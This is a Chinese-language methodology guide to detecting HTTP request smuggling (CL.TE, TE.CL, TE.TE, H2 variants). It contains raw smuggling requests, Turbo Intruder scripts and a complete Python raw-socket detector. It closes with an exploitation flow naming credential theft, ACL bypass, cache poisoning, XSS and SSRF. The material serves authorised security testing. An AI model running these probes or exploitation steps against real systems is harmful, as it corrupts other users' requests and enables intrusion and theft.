# HTTP 请求走私检测方法论

> 从发现到确认到利用的完整检测流程。先确认走私类型，再选择利用方式

---

## 一、检测决策树

```
目标使用什么协议栈？
├─ HTTP/2 前端 + HTTP/1.1 后端 → 测试 H2.CL / H2.TE / CRLF
├─ HTTP/1.1 前端 + HTTP/1.1 后端 → 测试 CL.TE / TE.CL / TE.TE
└─ 纯 HTTP/2 端到端 → 测试 H2.0 / H2C

检测方法选择：
├─ Timing-based（时间差异）→ 最安全，不影响其他用户
├─ Differential Response（差异响应）→ 更可靠，轻微影响
├─ OAST（带外检测）→ 最可靠的确认方式
└─ 自动化工具 → 综合多种方法
```

---

## 二、Timing-based Detection（时间差异法）

### 2.1 CL.TE 检测

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1\r\n
A\r\n
X
```

```
原理:
├─ 如果前端用 CL → 读 4 字节 ("1\r\nA") → 转发到后端
├─ 后端用 TE → 读 chunk "1\r\nA\r\n" → 期待下一个 chunk
├─ 后端等待更多数据 → 响应延迟（timeout）
└─ 如果响应延迟 5-10 秒以上 → CL.TE 确认

对照组:
├─ 正常请求响应时间: ~100ms
├─ 探测请求响应时间: ~5000ms+
└─ 差异 > 4 秒 → 高度疑似
```

### 2.2 TE.CL 检测

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
X
```

```
原理:
├─ 如果前端用 TE → 读到 "0\r\n\r\n" 结束 → 转发
├─ 后端用 CL=6 → 读 "0\r\n\r\nX" → 还差 1 字节
├─ 后端等待剩余数据 → 响应延迟
└─ 延迟 → TE.CL 确认
```

### 2.3 避免误报

```
Timing 法误报原因：
├─ 服务器本身响应慢（高负载）→ 多次测试取中位数
├─ 网络延迟波动 → 使用同一连接对比
├─ 后端超时设置 → 不同服务器超时时间不同
└─ WAF 拦截导致的延迟

排除方法:
├─ 发送正常请求作为基准，多次测量
├─ 确保延迟只在特定畸形请求时出现
├─ 交替发送正常/探测请求对比
└─ 使用不同的 CL/TE 组合排除单一原因
```

---

## 三、Differential Response 差异响应法

### 3.1 CL.TE 确认

```http
# Step 1: 走私一个会产生 404 的请求前缀
POST / HTTP/1.1
Host: target.com
Content-Length: 53
Transfer-Encoding: chunked

0

GET /hopefully-404-unique-path HTTP/1.1
Foo: x
```

```http
# Step 2: 立即发送正常请求
GET / HTTP/1.1
Host: target.com
```

```
预期结果:
├─ 如果 CL.TE 走私成功:
│   第二个正常 GET / 的响应变成 404（被走私前缀污染）
│   → 因为后端看到的是: GET /hopefully-404-unique-path HTTP/1.1\r\nFoo: xGET / HTTP/1.1\r\n...
│
├─ 如果不存在走私:
│   第一个请求正常返回 200
│   第二个请求也正常返回 200
│
└─ ⛔ 这会影响下一个请求 → 可能是其他用户的请求被污染
    → 仅在授权测试中使用
```

### 3.2 TE.CL 确认

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

75
GET /hopefully-404-unique-path HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

后续正常请求如果返回 404 → TE.CL 确认。

### 3.3 使用唯一标识符追踪

```
⛔ 关键 OPSEC: 使用唯一路径名避免混淆
├─ GET /smuggle-test-a1b2c3d4 → 唯一 404 路径
├─ Host: unique-id.burpcollaborator.net → OAST 确认
└─ X-Custom: smuggle-verify-TOKEN → 日志追踪
```

---

## 四、Turbo Intruder 自动化检测

### 4.1 CL.TE 自动检测脚本

```python
# Turbo Intruder: detect-clte.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.THREADED)

    # 探测请求 — 走私一个会导致 404 的前缀
    probe = '''POST / HTTP/1.1\r
Host: {host}\r
Content-Length: 71\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /smuggle-detect-{rand} HTTP/1.1\r
Host: {host}\r
X-Pad: x'''.format(host=target.baseInput.split('Host: ')[1].split('\r')[0],
                    rand='a1b2c3')

    # 正常请求 — 检查是否被走私前缀污染
    normal = '''GET / HTTP/1.1\r
Host: {host}\r
\r
'''.format(host=target.baseInput.split('Host: ')[1].split('\r')[0])

    # 发送探测
    engine.queue(probe)
    import time
    time.sleep(0.5)
    # 发送正常请求检查
    engine.queue(normal, gate='check')
    engine.openGate('check')

def handleResponse(req, interesting):
    if '404' in req.response:
        table.add(req)  # 正常请求返回 404 → 走私确认
```

### 4.2 TE.CL 自动检测

```python
# Turbo Intruder: detect-tecl.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.THREADED)

    probe = '''POST / HTTP/1.1\r
Host: {host}\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
96\r
GET /smuggle-detect-te HTTP/1.1\r
Host: {host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 15\r
\r
x=1\r
0\r
\r
'''.format(host=target.baseInput.split('Host: ')[1].split('\r')[0])

    engine.queue(probe)
    import time
    time.sleep(0.5)

    normal = '''GET / HTTP/1.1\r
Host: {host}\r
\r
'''.format(host=target.baseInput.split('Host: ')[1].split('\r')[0])

    engine.queue(normal, gate='check')
    engine.openGate('check')

def handleResponse(req, interesting):
    if '404' in req.response:
        table.add(req)
```

---

## 五、Burp Suite HTTP Request Smuggler 扩展

### 5.1 安装与使用

```
安装:
1. Burp → Extender → BApp Store
2. 搜索 "HTTP Request Smuggler" → Install
3. 或手动从 GitHub 下载 .jar: portswigger/http-request-smuggler

使用:
1. 在 Proxy history 中选择目标请求
2. 右键 → Extensions → HTTP Request Smuggler → Smuggle Probe
3. 扩展自动测试多种走私变体:
   ├─ CL.TE
   ├─ TE.CL
   ├─ TE.TE (畸形 TE 头)
   ├─ H2.CL
   ├─ H2.TE
   └─ CRLF in H2 headers
4. 结果出现在 Issues 面板中
```

### 5.2 扫描结果解读

```
Issue 类型:
├─ "HTTP request smuggling, CL.TE" → 确认 CL.TE 走私
│   Severity: High
│   Confidence: Certain (基于差异响应) / Tentative (基于 timing)
│
├─ "H2C smuggling" → HTTP/2 明文升级走私
├─ "HTTP/2 request smuggling via CRLF injection" → CRLF 注入
└─ "Response queue poisoning" → 响应队列投毒

⛔ Tentative 结果需手动验证 → 可能是 timing 误报
```

---

## 六、自动化检测脚本（Python Raw Socket）

### 6.1 CL.TE 检测器

```python
#!/usr/bin/env python3
"""HTTP Request Smuggling Detector — CL.TE / TE.CL"""
import socket
import ssl
import time
import sys

class SmugglingDetector:
    def __init__(self, host, port=443, use_ssl=True):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl

    def _connect(self):
        sock = socket.create_connection((self.host, self.port), timeout=15)
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _send_recv(self, payload, timeout=10):
        sock = self._connect()
        sock.settimeout(timeout)
        start = time.time()
        sock.sendall(payload.encode())
        try:
            response = sock.recv(65535).decode(errors='replace')
        except socket.timeout:
            response = None
        elapsed = time.time() - start
        sock.close()
        return response, elapsed

    def detect_clte_timing(self):
        """CL.TE timing detection"""
        print("[*] Testing CL.TE (timing-based)...")

        # Baseline
        normal = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 5\r\n"
            f"\r\n"
            f"x=123"
        )
        _, baseline = self._send_recv(normal)
        print(f"    Baseline: {baseline:.2f}s")

        # CL.TE probe: CL=4 覆盖到 "1\r\nA"，后端按 TE 等待更多 chunk
        probe = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"A\r\n"
            f"X"
        )
        _, probe_time = self._send_recv(probe)
        print(f"    Probe:    {probe_time:.2f}s")

        if probe_time > baseline + 4:
            print("[!] CL.TE smuggling LIKELY DETECTED")
            return True
        else:
            print("[-] CL.TE not detected")
            return False

    def detect_tecl_timing(self):
        """TE.CL timing detection"""
        print("[*] Testing TE.CL (timing-based)...")

        # Baseline
        normal = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 5\r\n"
            f"\r\n"
            f"x=123"
        )
        _, baseline = self._send_recv(normal)
        print(f"    Baseline: {baseline:.2f}s")

        # TE.CL probe: 前端按 TE 读完，后端按 CL=6 等待更多数据
        probe = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        )
        _, probe_time = self._send_recv(probe)
        print(f"    Probe:    {probe_time:.2f}s")

        if probe_time > baseline + 4:
            print("[!] TE.CL smuggling LIKELY DETECTED")
            return True
        else:
            print("[-] TE.CL not detected")
            return False

    def detect_tete(self):
        """TE.TE detection — 测试畸形 TE 头处理差异"""
        print("[*] Testing TE.TE variants...")

        te_variants = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
            "Transfer-encoding: chunked",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: chunked\r\n Transfer-Encoding: x",
        ]

        for variant in te_variants:
            probe = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: 4\r\n"
                f"{variant}\r\n"
                f"\r\n"
                f"1\r\n"
                f"A\r\n"
                f"X"
            )
            resp, elapsed = self._send_recv(probe)
            status = "TIMEOUT" if resp is None else resp.split('\r\n')[0] if resp else "EMPTY"
            flag = " ← ANOMALY" if elapsed > 5 else ""
            print(f"    [{elapsed:.1f}s] {variant.split(chr(13))[0]}: {status}{flag}")

    def run_all(self):
        print(f"=== HTTP Smuggling Detection: {self.host}:{self.port} ===\n")
        self.detect_clte_timing()
        print()
        self.detect_tecl_timing()
        print()
        self.detect_tete()

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else 'target.com'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    detector = SmugglingDetector(host, port)
    detector.run_all()
```

---

## 七、smuggler.py 工具

```bash
# 安装
git clone https://github.com/defparam/smuggler.git
cd smuggler

# 基本扫描
python3 smuggler.py -u https://target.com

# 指定方法
python3 smuggler.py -u https://target.com -m POST

# 静默模式（只显示发现）
python3 smuggler.py -u https://target.com -q

# 指定超时
python3 smuggler.py -u https://target.com -t 10

# 输出结果:
# [*] Testing CL.TE... VULNERABLE
# [*] Testing TE.CL... NOT VULNERABLE
# [*] Testing TE.TE... NOT VULNERABLE
```

---

## 八、False Positive 排除方法

```
常见误报原因及排除:
├─ 1. 服务器自身延迟波动
│   排除: 连续 5 次测试，3 次以上延迟才算确认
│
├─ 2. 前端直接拒绝畸形请求（400 Bad Request）
│   排除: 400 响应 ≠ 走私，前端已正确处理
│
├─ 3. WAF 拦截导致延迟
│   排除: WAF 通常返回特征响应（403 + WAF 页面），非超时
│
├─ 4. Keep-Alive 超时混淆
│   排除: 对比 Connection: close 和 keep-alive 的行为差异
│
├─ 5. CDN 缓存干扰
│   排除: 使用 Cache-Control: no-cache 或唯一 URL 参数
│
└─ 6. 后端多实例负载均衡
    排除: 差异响应法需在短时间内两个请求到同一后端
    → 使用同一 TCP 连接（HTTP/1.1 keep-alive）
```

---

## 九、从检测到利用的完整流程

```
Step 1: 协议识别
├─ curl -I https://target.com → 检查 HTTP 版本
├─ 检查响应头: Server, Via, X-Cache → 识别代理/CDN
└─ nmap -sV -p 80,443 target → 识别 Web 服务器

Step 2: Timing 探测（安全阶段）
├─ 发送 CL.TE timing probe → 记录延迟
├─ 发送 TE.CL timing probe → 记录延迟
├─ 发送 TE.TE variants → 记录异常
└─ 对比基准时间 → 筛选候选类型

Step 3: 差异响应确认（轻度影响）
├─ 走私 GET /404-unique-path 前缀
├─ 立即发送正常请求检查
├─ 404 响应 → 确认走私类型
└─ 重复 2-3 次排除偶发

Step 4: OAST 确认（可选，最可靠）
├─ 走私请求 Host: xxx.burpcollaborator.net
├─ 或走私请求到 http://xxx.oastify.com
├─ Collaborator 收到请求 → 100% 确认走私
└─ 且可确认走私请求的完整内容

Step 5: 选择利用方式
├─ 窃取凭据 → 走私 POST /log?stolen= 前缀
├─ 绕过 ACL → 走私 GET /admin
├─ 缓存投毒 → 走私请求到静态资源路径 + 恶意 Host
├─ XSS 升级 → 走私包含 XSS 的请求
└─ SSRF → 走私请求到内部服务

Step 6: 验证利用
├─ 确认走私请求被后端处理
├─ 收集证据（响应、截图、日志）
└─ 评估影响范围
```

---

## 参考链接

- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [defparam/smuggler - GitHub](https://github.com/defparam/smuggler)
- [Burp HTTP Request Smuggler Extension](https://github.com/PortSwigger/http-request-smuggler)
- [James Kettle - HTTP Desync Attacks (2019)](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
